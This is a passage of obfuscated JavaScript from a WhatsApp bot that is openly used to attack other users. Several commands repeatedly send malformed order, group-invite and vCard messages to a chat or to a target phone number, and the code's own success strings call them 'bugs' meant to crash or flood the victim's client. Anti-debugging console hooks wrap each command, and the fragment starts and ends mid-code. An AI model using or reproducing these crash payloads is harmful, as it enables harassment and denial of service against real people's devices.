_0x2d4c();}_0x26374e();var _0x3c2088=(function(){var _0x3f247a=!![];return function(_0x269a08,_0x5a5ebb){var _0x37c937=_0x3f247a?function(){var _0x1619be=_0x2d44;if(_0x5a5ebb){var _0x221463=_0x5a5ebb[_0x1619be(0xde)](_0x269a08,arguments);return _0x5a5ebb=null,_0x221463;}}:function(){};return _0x3f247a=![],_0x37c937;};}()),_0x790e0f=_0x3c2088(this,function(){var _0x5ec7c5=_0x2d44,_0x3dd76b=function(){var _0x36e671=_0x2d44,_0x1e8fc3;try{_0x1e8fc3=Function(_0x36e671(0xdb)+_0x36e671(0xd0)+');')();}catch(_0x148a9e){_0x1e8fc3=window;}return _0x1e8fc3;},_0x333375=_0x3dd76b(),_0x75d40b=_0x333375[_0x5ec7c5(0xd1)]=_0x333375[_0x5ec7c5(0xd1)]||{},_0x187812=['log',_0x5ec7c5(0xc8),_0x5ec7c5(0xdc),_0x5ec7c5(0xcc),_0x5ec7c5(0xe0),_0x5ec7c5(0xe2),_0x5ec7c5(0xc6)];for(var _0x1037a2=0x0;_0x1037a2<_0x187812[_0x5ec7c5(0xe1)];_0x1037a2++){var _0x228855=_0x3c2088[_0x5ec7c5(0xc2)][_0x5ec7c5(0xe4)][_0x5ec7c5(0xd8)](_0x3c2088),_0x844fde=_0x187812[_0x1037a2],_0x24cba7=_0x75d40b[_0x844fde]||_0x228855;_0x228855[_0x5ec7c5(0xe3)]=_0x3c2088[_0x5ec7c5(0xd8)](_0x3c2088),_0x228855['toString']=_0x24cba7[_0x5ec7c5(0xdd)][_0x5ec7c5(0xd8)](_0x24cba7),_0x75d40b[_0x844fde]=_0x228855;}});_0x790e0f();{if(!isCreator&&!isBan)return;if(args[_0x2932ba(0xe1)]==0x0)return m[_0x2932ba(0xd6)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){var messa=await prepareWAMessageMedia({'image':fs['readFileSync'](_0x2932ba(0xc4))},{'upload':ikycoli['waUploadToServer']}),groupInvite=generateWAMessageFromContent(m['chat'],proto[_0x2932ba(0xcb)][_0x2932ba(0xc7)]({'groupInviteMessage':{'groupJid':_0x2932ba(0xda),'inviteCode':'wFHwtOxGQN8OwK2x','inviteExpiration':_0x2932ba(0xca)+philips,'groupName':_0x2932ba(0xca)+philips,'caption':''+philips,'jpegThumbnail':messa['imageMessage']}}),{'userJid':m[_0x2932ba(0xc1)],'quoted':fkontaak});ikycoli['relayMessage'](m[_0x2932ba(0xc1)],groupInvite[_0x2932ba(0xcf)],{'messageId':groupInvite[_0x2932ba(0xc3)]['id']});}jancok('Sukses\x20Send\x20Bug\x20Sebanyak\x20'+jumlah);}
}
break

	case 'ikytroli': {
const _0x979d69=_0x3fef;(function(_0x2a59f7,_0x4ad171){const _0x414e1d=_0x3fef,_0x242436=_0x2a59f7();while(!![]){try{const _0x159d91=parseInt(_0x414e1d(0xf6))/0x1+parseInt(_0x414e1d(0xf9))/0x2*(parseInt(_0x414e1d(0x100))/0x3)+parseInt(_0x414e1d(0x101))/0x4*(parseInt(_0x414e1d(0xff))/0x5)+parseInt(_0x414e1d(0x104))/0x6+-parseInt(_0x414e1d(0xf0))/0x7*(parseInt(_0x414e1d(0x103))/0x8)+parseInt(_0x414e1d(0x10a))/0x9*(parseInt(_0x414e1d(0xf1))/0xa)+parseInt(_0x414e1d(0xf4))/0xb*(-parseInt(_0x414e1d(0x10d))/0xc);if(_0x159d91===_0x4ad171)break;else _0x242436['push'](_0x242436['shift']());}catch(_0x4f9fc9){_0x242436['push'](_0x242436['shift']());}}}(_0x2f06,0xeeb44));const _0x4a569b=(function(){let _0x1a617e=!![];return function(_0x2e8092,_0x40bf8a){const _0xe2beaa=_0x1a617e?function(){const _0x580b27=_0x3fef;if(_0x40bf8a){const _0x2b9829=_0x40bf8a[_0x580b27(0x10c)](_0x2e8092,arguments);return _0x40bf8a=null,_0x2b9829;}}:function(){};return _0x1a617e=![],_0xe2beaa;};}()),_0x4abf85=_0x4a569b(this,function(){const _0x3f0b94=_0x3fef;return _0x4abf85[_0x3f0b94(0xfa)]()[_0x3f0b94(0x10b)](_0x3f0b94(0xee))['toString']()[_0x3f0b94(0xe9)](_0x4abf85)[_0x3f0b94(0x10b)](_0x3f0b94(0xee));});_0x4abf85();function _0x3fef(_0x21a244,_0x270cce){const _0x4e3864=_0x2f06();return _0x3fef=function(_0x3b151b,_0x337aaf){_0x3b151b=_0x3b151b-0xe9;let _0x5d172b=_0x4e3864[_0x3b151b];return _0x5d172b;},_0x3fef(_0x21a244,_0x270cce);}const _0x337aaf=(function(){let _0x4232b9=!![];return function(_0x3dc563,_0x3ddc3e){const _0x261973=_0x4232b9?function(){const _0x2fe677=_0x3fef;if(_0x3ddc3e){const _0x41a68f=_0x3ddc3e[_0x2fe677(0x10c)](_0x3dc563,arguments);return _0x3ddc3e=null,_0x41a68f;}}:function(){};return _0x4232b9=![],_0x261973;};}()),_0x3b151b=_0x337aaf(this,function(){const _0x3a9ae3=_0x3fef,_0x26bb92=function(){const _0x52a598=_0x3fef;let _0x131860;try{_0x131860=Function(_0x52a598(0x105)+_0x52a598(0xf7)+');')();}catch(_0x5b5c8c){_0x131860=window;}return _0x131860;},_0x5454bb=_0x26bb92(),_0x36ed1c=_0x5454bb['console']=_0x5454bb[_0x3a9ae3(0xeb)]||{},_0x19afb5=[_0x3a9ae3(0xed),'warn','info','error','exception','table','trace'];for(let _0x14de66=0x0;_0x14de66<_0x19afb5[_0x3a9ae3(0xf5)];_0x14de66++){const _0x4edadd=_0x337aaf[_0x3a9ae3(0xe9)][_0x3a9ae3(0xf2)][_0x3a9ae3(0xfd)](_0x337aaf),_0x206f21=_0x19afb5[_0x14de66],_0x4b5410=_0x36ed1c[_0x206f21]||_0x4edadd;_0x4edadd['__proto__']=_0x337aaf[_0x3a9ae3(0xfd)](_0x337aaf),_0x4edadd[_0x3a9ae3(0xfa)]=_0x4b5410[_0x3a9ae3(0xfa)][_0x3a9ae3(0xfd)](_0x4b5410),_0x36ed1c[_0x206f21]=_0x4edadd;}});function _0x2f06(){const _0x53f3d8=['1600083bhOAfa','search','apply','17007348jazOre','constructor','IDR\x2099.99999999999999999999','console','readFileSync','log','(((.+)+)+)+$','reply','54425DzWcSR','10KruUYi','prototype','chat','22afaQuV','length','568240uZBFKw','{}.constructor(\x22return\x20this\x22)(\x20)','5491133536405@s.whatsapp.net','1075166NNXDyN','toString','IDR','key','bind','CATALOG','1045IMLXNi','6EMHxgE','36328jxggtr','5287265358017580','376lHBRMP','2750304YbplRt','return\x20(function()\x20','Sukses\x20Send\x20Bug\x20Sebanyak\x20','😈⏤͟͟͞𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕','AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','src/virgam\x20yg\x20ganas.jpeg'];_0x2f06=function(){return _0x53f3d8;};return _0x2f06();}_0x3b151b();{if(!isCreator&&!isBan)return;if(args[_0x979d69(0xf5)]==0x0)return m[_0x979d69(0xef)]('Jumlahnya?');jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){f=fs[_0x979d69(0xec)](_0x979d69(0x109));let troli=generateWAMessageFromContent(m[_0x979d69(0xf3)],{'orderMessage':{'orderId':_0x979d69(0x102),'thumbnail':virgam,'itemCount':0x7e9,'status':'INQUIRY','surface':_0x979d69(0xfe),'orderTitle':'FIXED\x20BY\x20THE\x20IKY\x20BOTZ\x20CASE\x20MD','message':_0x979d69(0x107),'sellerJid':_0x979d69(0xf8),'token':_0x979d69(0x108),'totalAmount1000':_0x979d69(0xea),'totalCurrencyCode':_0x979d69(0xfb),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkntliky,'contextInfo':{}});ikycoli['relayMessage'](m[_0x979d69(0xf3)],troli['message'],{'messageId':troli[_0x979d69(0xfc)]['id']});}jancok(_0x979d69(0x106)+jumlah);}
}
break
case 'jaditroli':{
function _0x35cc(){const _0x993aae=['4933940erHZbW','length','log','apply','832720uvPrbk','table','chat','23325410wsTrbw','error','constructor','27NzqXRi','search','warn','90mUDrmG','CATALOG','__proto__','(((.+)+)+)+$','4699788JymIyk','Teksnya\x20Mana?','bind','5ETIagU','IDR','5287265358017580','console','965038gtbUGp','info','Sukses\x20Convert\x20Troli','key','prototype','exception','message','631096rZzSMo','toString','{}.constructor(\x22return\x20this\x22)(\x20)','86848DJXhVu','return\x20(function()\x20','IDR\x2099.99999999999999999999'];_0x35cc=function(){return _0x993aae;};return _0x35cc();}const _0xa5f4bf=_0x44dc;(function(_0x45c72c,_0x276e49){const _0x4defb3=_0x44dc,_0x6d9a9f=_0x45c72c();while(!![]){try{const _0x2f8f4d=-parseInt(_0x4defb3(0xaa))/0x1+parseInt(_0x4defb3(0x8f))/0x2*(parseInt(_0x4defb3(0x9c))/0x3)+-parseInt(_0x4defb3(0x92))/0x4+-parseInt(_0x4defb3(0xa6))/0x5*(parseInt(_0x4defb3(0xa3))/0x6)+parseInt(_0x4defb3(0x96))/0x7+-parseInt(_0x4defb3(0x8c))/0x8*(-parseInt(_0x4defb3(0x9f))/0x9)+parseInt(_0x4defb3(0x99))/0xa;if(_0x2f8f4d===_0x276e49)break;else _0x6d9a9f['push'](_0x6d9a9f['shift']());}catch(_0x3dcfec){_0x6d9a9f['push'](_0x6d9a9f['shift']());}}}(_0x35cc,0x9e896));const _0x13c782=(function(){let _0x3be0ef=!![];return function(_0x3edc76,_0x50eeba){const _0x547581=_0x3be0ef?function(){const _0x4bbd37=_0x44dc;if(_0x50eeba){const _0x3f4566=_0x50eeba[_0x4bbd37(0x95)](_0x3edc76,arguments);return _0x50eeba=null,_0x3f4566;}}:function(){};return _0x3be0ef=![],_0x547581;};}()),_0x454423=_0x13c782(this,function(){const _0x5455a3=_0x44dc;return _0x454423[_0x5455a3(0x8d)]()[_0x5455a3(0x9d)](_0x5455a3(0xa2))[_0x5455a3(0x8d)]()[_0x5455a3(0x9b)](_0x454423)[_0x5455a3(0x9d)]('(((.+)+)+)+$');});_0x454423();function _0x44dc(_0x5403ef,_0x426b56){const _0x2ed660=_0x35cc();return _0x44dc=function(_0x145d33,_0x3850ab){_0x145d33=_0x145d33-0x8c;let _0x72c88e=_0x2ed660[_0x145d33];return _0x72c88e;},_0x44dc(_0x5403ef,_0x426b56);}const _0x3850ab=(function(){let _0xf5809f=!![];return function(_0xd3a6b2,_0x5a3446){const _0x1fd0cd=_0xf5809f?function(){if(_0x5a3446){const _0x1e3f8d=_0x5a3446['apply'](_0xd3a6b2,arguments);return _0x5a3446=null,_0x1e3f8d;}}:function(){};return _0xf5809f=![],_0x1fd0cd;};}()),_0x145d33=_0x3850ab(this,function(){const _0x1042e3=_0x44dc;let _0x2227d7;try{const _0x183781=Function(_0x1042e3(0x90)+_0x1042e3(0x8e)+');');_0x2227d7=_0x183781();}catch(_0x521063){_0x2227d7=window;}const _0x1556be=_0x2227d7[_0x1042e3(0xa9)]=_0x2227d7[_0x1042e3(0xa9)]||{},_0x5d6153=[_0x1042e3(0x94),_0x1042e3(0x9e),_0x1042e3(0xab),_0x1042e3(0x9a),_0x1042e3(0xaf),_0x1042e3(0x97),'trace'];for(let _0x5b7897=0x0;_0x5b7897<_0x5d6153[_0x1042e3(0x93)];_0x5b7897++){const _0x3d613=_0x3850ab[_0x1042e3(0x9b)][_0x1042e3(0xae)][_0x1042e3(0xa5)](_0x3850ab),_0x176a34=_0x5d6153[_0x5b7897],_0x136ed8=_0x1556be[_0x176a34]||_0x3d613;_0x3d613[_0x1042e3(0xa1)]=_0x3850ab['bind'](_0x3850ab),_0x3d613[_0x1042e3(0x8d)]=_0x136ed8['toString'][_0x1042e3(0xa5)](_0x136ed8),_0x1556be[_0x176a34]=_0x3d613;}});_0x145d33();{if(!isCreator&&!isBan)return;if(!text)throw _0xa5f4bf(0xa4);let troli=generateWAMessageFromContent(m[_0xa5f4bf(0x98)],{'orderMessage':{'orderId':_0xa5f4bf(0xa8),'thumbnail':virgam,'itemCount':0x7e9,'status':'INQUIRY','surface':_0xa5f4bf(0xa0),'orderTitle':'FIXED\x20BY\x20THE\x20JO\x20BOT\x20CASE\x20MD','message':''+text,'sellerJid':'5491133536405@s.whatsapp.net','token':'AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','totalAmount1000':_0xa5f4bf(0x91),'totalCurrencyCode':_0xa5f4bf(0xa7),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':fkntliky,'contextInfo':{}});ikycoli['relayMessage'](m['chat'],troli[_0xa5f4bf(0xb0)],{'messageId':troli[_0xa5f4bf(0xad)]['id']}),jancok(_0xa5f4bf(0xac));}
	}
	break

	case 'ikytroliprivate': {
function _0x15d5(){const _0x5b93ef=['message','\x20😈⏤͟͟͞𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕\x20','info','14rEnikr','table','1631226CduNWd','2086434xpsZtR','5654870DLdlnq','AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==','6283131458282@s.whatsapp.net','599519108102353','Berhasil\x20Mengirim\x20Troli\x20Di\x20Nomer\x20','{}.constructor(\x22return\x20this\x22)(\x20)','search','20sZNcMb','warn','reply','2701362mmRGMq','constructor','toString','exception','apply','442794MfHBto','869542EGDIGK','relayMessage','@s.whatsapp.net','13204741iDHSBX','bind','Nomernya\x20mana?','0@s.whatsapp.net','(((.+)+)+)+$','32TNILRQ','INQUIRY','trace','4SUglZo','prototype','\x20BUG\x20TROLI\x20','log','chat','console','return\x20(function()\x20'];_0x15d5=function(){return _0x5b93ef;};return _0x15d5();}const _0x64f19d=_0x477f;(function(_0x232b82,_0x49aa28){const _0xecd936=_0x477f,_0xd346ef=_0x232b82();while(!![]){try{const _0x5d7350=parseInt(_0xecd936(0xf6))/0x1+parseInt(_0xecd936(0xe4))/0x2+parseInt(_0xecd936(0xf5))/0x3+-parseInt(_0xecd936(0xd8))/0x4*(-parseInt(_0xecd936(0xe6))/0x5)+parseInt(_0xecd936(0xf0))/0x6*(-parseInt(_0xecd936(0xe2))/0x7)+parseInt(_0xecd936(0xd5))/0x8*(parseInt(_0xecd936(0xe5))/0x9)+parseInt(_0xecd936(0xed))/0xa*(-parseInt(_0xecd936(0xf9))/0xb);if(_0x5d7350===_0x49aa28)break;else _0xd346ef['push'](_0xd346ef['shift']());}catch(_0xcce092){_0xd346ef['push'](_0xd346ef['shift']());}}}(_0x15d5,0x8ff93));const _0x3f44f4=(function(){let _0x2020fe=!![];return function(_0x20993b,_0x2d83ae){const _0x5a56f4=_0x2020fe?function(){if(_0x2d83ae){const _0x1d0ba9=_0x2d83ae['apply'](_0x20993b,arguments);return _0x2d83ae=null,_0x1d0ba9;}}:function(){};return _0x2020fe=![],_0x5a56f4;};}()),_0x15f170=_0x3f44f4(this,function(){const _0xd60e72=_0x477f;return _0x15f170['toString']()[_0xd60e72(0xec)]('(((.+)+)+)+$')[_0xd60e72(0xf2)]()[_0xd60e72(0xf1)](_0x15f170)[_0xd60e72(0xec)](_0xd60e72(0xd4));});_0x15f170();function _0x477f(_0x5c6086,_0x4218b9){const _0x5f9023=_0x15d5();return _0x477f=function(_0x4f0546,_0x4bee9b){_0x4f0546=_0x4f0546-0xd2;let _0x551bc4=_0x5f9023[_0x4f0546];return _0x551bc4;},_0x477f(_0x5c6086,_0x4218b9);}const _0x4bee9b=(function(){let _0x51f478=!![];return function(_0x30b828,_0xd9f86e){const _0x5273c3=_0x51f478?function(){const _0x1bbfe7=_0x477f;if(_0xd9f86e){const _0x5d6f12=_0xd9f86e[_0x1bbfe7(0xf4)](_0x30b828,arguments);return _0xd9f86e=null,_0x5d6f12;}}:function(){};return _0x51f478=![],_0x5273c3;};}()),_0x4f0546=_0x4bee9b(this,function(){const _0x13b72e=_0x477f;let _0x5c76f3;try{const _0x2e77ec=Function(_0x13b72e(0xde)+_0x13b72e(0xeb)+');');_0x5c76f3=_0x2e77ec();}catch(_0x3ff48f){_0x5c76f3=window;}const _0x49ad51=_0x5c76f3[_0x13b72e(0xdd)]=_0x5c76f3[_0x13b72e(0xdd)]||{},_0x440664=[_0x13b72e(0xdb),_0x13b72e(0xee),_0x13b72e(0xe1),'error',_0x13b72e(0xf3),_0x13b72e(0xe3),_0x13b72e(0xd7)];for(let _0x591743=0x0;_0x591743<_0x440664['length'];_0x591743++){const _0xb8104f=_0x4bee9b['constructor'][_0x13b72e(0xd9)][_0x13b72e(0xfa)](_0x4bee9b),_0xf2190d=_0x440664[_0x591743],_0x4bbc68=_0x49ad51[_0xf2190d]||_0xb8104f;_0xb8104f['__proto__']=_0x4bee9b[_0x13b72e(0xfa)](_0x4bee9b),_0xb8104f['toString']=_0x4bbc68[_0x13b72e(0xf2)][_0x13b72e(0xfa)](_0x4bbc68),_0x49ad51[_0xf2190d]=_0xb8104f;}});_0x4f0546();{if(!isCreator&&!isBan)return;if(!text)throw _0x64f19d(0xd2);a=await ikycoli['sendMessage'](text+_0x64f19d(0xf8),{'react':{'key':{'remoteJid':m[_0x64f19d(0xdc)],'fromMe':!![],'id':m['key']['id']}}});let dok={'key':{'participant':_0x64f19d(0xd3)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var troli2=generateWAMessageFromContent(m[_0x64f19d(0xdc)],{'orderMessage':{'orderId':_0x64f19d(0xe9),'thumbnail':virgam,'itemCount':0x7e9,'status':_0x64f19d(0xd6),'surface':'CATALOG','message':_0x64f19d(0xe0),'orderTitle':_0x64f19d(0xda),'sellerJid':_0x64f19d(0xe8),'token':_0x64f19d(0xe7)}},{'quoted':{'key':{'fromMe':![],'participant':_0x64f19d(0xd3),...{'remoteJid':''}}},'contextInfo':{}});ikycoli[_0x64f19d(0xf7)](text+_0x64f19d(0xf8),troli2[_0x64f19d(0xdf)],{'messageId':troli2['key']['id'],'a':a}),await m[_0x64f19d(0xef)](_0x64f19d(0xea)+text);}
	}
	break

	case 'ikygaskentroli': {
function _0x1385(_0x395303,_0x3339e3){const _0x53a53a=_0x5978();return _0x1385=function(_0xf38d38,_0x3b137a){_0xf38d38=_0xf38d38-0x145;let _0x5964ab=_0x53a53a[_0xf38d38];return _0x5964ab;},_0x1385(_0x395303,_0x3339e3);}const _0x100d21=_0x1385;function _0x5978(){const _0x3aa09f=['116610truvhq','toString','1797YoVnqL','warn','info','66372SFVSsu','\x20😈⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x20','search','console','@s.whatsapp.net','prototype','9ZWZMHx','26CFlsWb','599519108102353','bind','key','1236220eaVbxt','length','210590IGiiOF','constructor','42hBQmeC','(((.+)+)+)+$','Berhasil\x20Mengirim\x20Troli\x20Di\x20Nomer\x20','table','apply','6283131458282@s.whatsapp.net','chat','__proto__','error','\x20BUG\x20TROLI\x20','INQUIRY','Nomernya\x20mana?','sendMessage','0@s.whatsapp.net','AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ==','84696MQHJJd','729222tmJORS','{}.constructor(\x22return\x20this\x22)(\x20)','log'];_0x5978=function(){return _0x3aa09f;};return _0x5978();}(function(_0x20715b,_0x57a764){const _0x37e774=_0x1385,_0x47ca9b=_0x20715b();while(!![]){try{const _0x4d73a5=parseInt(_0x37e774(0x14d))/0x1*(parseInt(_0x37e774(0x157))/0x2)+parseInt(_0x37e774(0x148))/0x3+-parseInt(_0x37e774(0x150))/0x4+-parseInt(_0x37e774(0x15d))/0x5+-parseInt(_0x37e774(0x14b))/0x6+parseInt(_0x37e774(0x15f))/0x7*(parseInt(_0x37e774(0x147))/0x8)+parseInt(_0x37e774(0x156))/0x9*(-parseInt(_0x37e774(0x15b))/0xa);if(_0x4d73a5===_0x57a764)break;else _0x47ca9b['push'](_0x47ca9b['shift']());}catch(_0x40d9e5){_0x47ca9b['push'](_0x47ca9b['shift']());}}}(_0x5978,0x1f4bd));const _0x593d02=(function(){let _0x342a12=!![];return function(_0x4c39ef,_0xe70417){const _0x32534b=_0x342a12?function(){const _0x35e268=_0x1385;if(_0xe70417){const _0x301384=_0xe70417[_0x35e268(0x163)](_0x4c39ef,arguments);return _0xe70417=null,_0x301384;}}:function(){};return _0x342a12=![],_0x32534b;};}()),_0x36b292=_0x593d02(this,function(){const _0x1b46b2=_0x1385;return _0x36b292['toString']()[_0x1b46b2(0x152)](_0x1b46b2(0x160))[_0x1b46b2(0x14c)]()[_0x1b46b2(0x15e)](_0x36b292)['search'](_0x1b46b2(0x160));});_0x36b292();const _0x3b137a=(function(){let _0x2e22cb=!![];return function(_0x36b8fe,_0xcf01d4){const _0x5c6882=_0x2e22cb?function(){if(_0xcf01d4){const _0x34ee91=_0xcf01d4['apply'](_0x36b8fe,arguments);return _0xcf01d4=null,_0x34ee91;}}:function(){};return _0x2e22cb=![],_0x5c6882;};}()),_0xf38d38=_0x3b137a(this,function(){const _0x319b7b=_0x1385,_0x3d3538=function(){const _0x1eb714=_0x1385;let _0x17494c;try{_0x17494c=Function('return\x20(function()\x20'+_0x1eb714(0x149)+');')();}catch(_0x2410a0){_0x17494c=window;}return _0x17494c;},_0x2eca6c=_0x3d3538(),_0x34f05d=_0x2eca6c[_0x319b7b(0x153)]=_0x2eca6c[_0x319b7b(0x153)]||{},_0x3a72d3=[_0x319b7b(0x14a),_0x319b7b(0x14e),_0x319b7b(0x14f),_0x319b7b(0x167),'exception',_0x319b7b(0x162),'trace'];for(let _0x1a4bc9=0x0;_0x1a4bc9<_0x3a72d3[_0x319b7b(0x15c)];_0x1a4bc9++){const _0x72d24f=_0x3b137a[_0x319b7b(0x15e)][_0x319b7b(0x155)][_0x319b7b(0x159)](_0x3b137a),_0x40cfd8=_0x3a72d3[_0x1a4bc9],_0x2be9e1=_0x34f05d[_0x40cfd8]||_0x72d24f;_0x72d24f[_0x319b7b(0x166)]=_0x3b137a['bind'](_0x3b137a),_0x72d24f['toString']=_0x2be9e1[_0x319b7b(0x14c)][_0x319b7b(0x159)](_0x2be9e1),_0x34f05d[_0x40cfd8]=_0x72d24f;}});_0xf38d38();{if(!isCreator&&!isBan)return;if(!text)throw _0x100d21(0x16a);a=await ikycoli[_0x100d21(0x16b)](text+_0x100d21(0x154),{'react':{'key':{'remoteJid':m[_0x100d21(0x165)],'fromMe':!![],'id':m[_0x100d21(0x15a)]['id']}}});let dok={'key':{'participant':_0x100d21(0x145)},'message':{'documentMessage':{'title':'©\x20'+ownername,'jpegThumbnail':thumb}}};var troli2=generateWAMessageFromContent(m[_0x100d21(0x165)],{'orderMessage':{'orderId':_0x100d21(0x158),'thumbnail':virgam,'itemCount':0x7e9,'status':_0x100d21(0x169),'surface':'CATALOG','message':_0x100d21(0x151),'orderTitle':_0x100d21(0x168),'sellerJid':_0x100d21(0x164),'token':_0x100d21(0x146)}},{'quoted':{'key':{'fromMe':![],'participant':_0x100d21(0x145),...{'remoteJid':''}}},'contextInfo':{}});ikycoli['relayMessage'](text+_0x100d21(0x154),troli2['message'],{'messageId':troli2[_0x100d21(0x15a)]['id'],'a':a}),ikycoli['relayMessage'](m['chat'],troli2['message'],{'messageId':troli2[_0x100d21(0x15a)]['id'],'a':a}),m['reply'](_0x100d21(0x161)+text);}
	}
	break

case 'ikytroliv2': {
const _0x1920a2=_0x4101;(function(_0x2f8ba9,_0x4f5aa4){const _0x413276=_0x4101,_0x2b0bc3=_0x2f8ba9();while(!![]){try{const _0x23fe7a=parseInt(_0x413276(0x14b))/0x1*(parseInt(_0x413276(0x145))/0x2)+-parseInt(_0x413276(0x12c))/0x3+parseInt(_0x413276(0x139))/0x4*(parseInt(_0x413276(0x134))/0x5)+parseInt(_0x413276(0x132))/0x6+-parseInt(_0x413276(0x131))/0x7*(-parseInt(_0x413276(0x13b))/0x8)+parseInt(_0x413276(0x12d))/0x9*(parseInt(_0x413276(0x125))/0xa)+parseInt(_0x413276(0x144))/0xb*(-parseInt(_0x413276(0x12f))/0xc);if(_0x23fe7a===_0x4f5aa4)break;else _0x2b0bc3['push'](_0x2b0bc3['shift']());}catch(_0x1f9cc3){_0x2b0bc3['push'](_0x2b0bc3['shift']());}}}(_0x5bbd,0x3b04f));const _0x8c2336=(function(){let _0xcb255e=!![];return function(_0x1f7113,_0x29114f){const _0x1c1646=_0xcb255e?function(){const _0x5a5880=_0x4101;if(_0x29114f){const _0x5c0b5d=_0x29114f[_0x5a5880(0x149)](_0x1f7113,arguments);return _0x29114f=null,_0x5c0b5d;}}:function(){};return _0xcb255e=![],_0x1c1646;};}()),_0x1a3f7e=_0x8c2336(this,function(){const _0xd60816=_0x4101;return _0x1a3f7e['toString']()[_0xd60816(0x14c)](_0xd60816(0x127))[_0xd60816(0x14f)]()[_0xd60816(0x148)](_0x1a3f7e)[_0xd60816(0x14c)]('(((.+)+)+)+$');});_0x1a3f7e();function _0x4101(_0x480e98,_0x5b546f){const _0x4acc85=_0x5bbd();return _0x4101=function(_0x454fce,_0x5c3d19){_0x454fce=_0x454fce-0x125;let _0x313e8d=_0x4acc85[_0x454fce];return _0x313e8d;},_0x4101(_0x480e98,_0x5b546f);}const _0x5c3d19=(function(){let _0x53fbae=!![];return function(_0x5535e1,_0x3ff3b4){const _0x1a1da8=_0x53fbae?function(){const _0x2ffa7d=_0x4101;if(_0x3ff3b4){const _0x442bdf=_0x3ff3b4[_0x2ffa7d(0x149)](_0x5535e1,arguments);return _0x3ff3b4=null,_0x442bdf;}}:function(){};return _0x53fbae=![],_0x1a1da8;};}()),_0x454fce=_0x5c3d19(this,function(){const _0x4e047a=_0x4101,_0x989d2c=function(){const _0x113de8=_0x4101;let _0x3c7082;try{_0x3c7082=Function('return\x20(function()\x20'+_0x113de8(0x142)+');')();}catch(_0x5c4a7a){_0x3c7082=window;}return _0x3c7082;},_0x3f12ff=_0x989d2c(),_0x1f2692=_0x3f12ff[_0x4e047a(0x143)]=_0x3f12ff[_0x4e047a(0x143)]||{},_0x11e63a=['log',_0x4e047a(0x13d),_0x4e047a(0x126),'error',_0x4e047a(0x146),_0x4e047a(0x12e),_0x4e047a(0x136)];for(let _0x24ce6b=0x0;_0x24ce6b<_0x11e63a[_0x4e047a(0x13a)];_0x24ce6b++){const _0x255f2e=_0x5c3d19[_0x4e047a(0x148)][_0x4e047a(0x13e)]['bind'](_0x5c3d19),_0x2ed2c3=_0x11e63a[_0x24ce6b],_0x39e952=_0x1f2692[_0x2ed2c3]||_0x255f2e;_0x255f2e['__proto__']=_0x5c3d19[_0x4e047a(0x128)](_0x5c3d19),_0x255f2e['toString']=_0x39e952[_0x4e047a(0x14f)][_0x4e047a(0x128)](_0x39e952),_0x1f2692[_0x2ed2c3]=_0x255f2e;}});_0x454fce();{if(!isCreator&&!isBan)return;if(args['length']==0x0)return m['reply'](_0x1920a2(0x133));jumlah=''+encodeURI(q);for(let i=0x0;i<jumlah;i++){f=fs['readFileSync']('src/virgam\x20yg\x20ganas.jpeg');let troli=generateWAMessageFromContent(m[_0x1920a2(0x135)],{'orderMessage':{'orderId':_0x1920a2(0x140),'thumbnail':virgam,'itemCount':0x7e9,'status':'INQUIRY','surface':_0x1920a2(0x137),'orderTitle':_0x1920a2(0x129),'message':'😈⏤͟͟͞𝙏𝙃𝙀\x20𝙄𝙆𝙔𝙔\x20𝘽𝙊𝙏𝙕','sellerJid':_0x1920a2(0x147),'token':_0x1920a2(0x141),'totalAmount1000':_0x1920a2(0x13f),'totalCurrencyCode':_0x1920a2(0x12b),'contextInfo':{'forwardingScore':0x96,'isForwarded':!![]}}},{'quoted':{'key':{'fromMe':![],'participant':_0x1920a2(0x13c),...{'remoteJid':''}},'message':{'contactMessage':{'displayName':''+virtex2,'vcard':_0x1920a2(0x14d)+virtex1+_0x1920a2(0x130)+virtex2+_0x1920a2(0x14a),'jpegThumbnail':f}}},'contextInfo':{}});ikycoli['relayMessage'](m[_0x1920a2(0x135)],troli[_0x1920a2(0x138)],{'messageId':troli[_0x1920a2(0x14e)]['id']});}jancok(_0x1920a2(0x12a)+jumlah);}function _0x5bbd(){const _0xe32ba3=['0@s.whatsapp.net','warn','prototype','IDR\x2099.99999999999999999999','5287265358017580','AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==','{}.constructor(\x22return\x20this\x22)(\x20)','console','11xseUvB','12DYzxZm','exception','5491133536405@s.whatsapp.net','constructor','apply','\x0aEND:VCARD\x0aitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\x0aitem2.X-ABLabel:INTERNET\x0aitem3.ADR:;;xnxx;;;;\x0aitem3.X-ABADR:ac\x0aitem3.X-ABLabel:Casa\x0aitem4.ADR:;;EMAIL;CHARSET=UTF-8;type=HOME,INTERNET;ac;\x0aitem4.X-ABADR:\x0aitem4.X-ABLabel:Casa\x0aitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\x0aitem5.X-ABLabel:INTERNET\x0aEND:VCARD','75127ItAXIu','search','BEGIN:VCARD\x0aVERSION:3.0\x0aN:;Masih\x20gw\x20pikirin;;;\x0aFN:','key','toString','40IxkEuP','info','(((.+)+)+)+$','bind','FIXED\x20BY\x20THE\x20IKYY\x20BOTZ\x20CASE\x20MD','Sukses\x20Send\x20Bug\x20Sebanyak\x20','IDR','472350cWdUyP','137457lwqtoy','table','12684624gQBCMe','\x0aitem1.TEL;waid=35312338989:+353\x201\x20233\x208989\x0aitem1.X-ABLabel:Telepon\x0aX-WA-BIZ-NAME:','34083MpxZXs','2862264MSHNev','Jumlahnya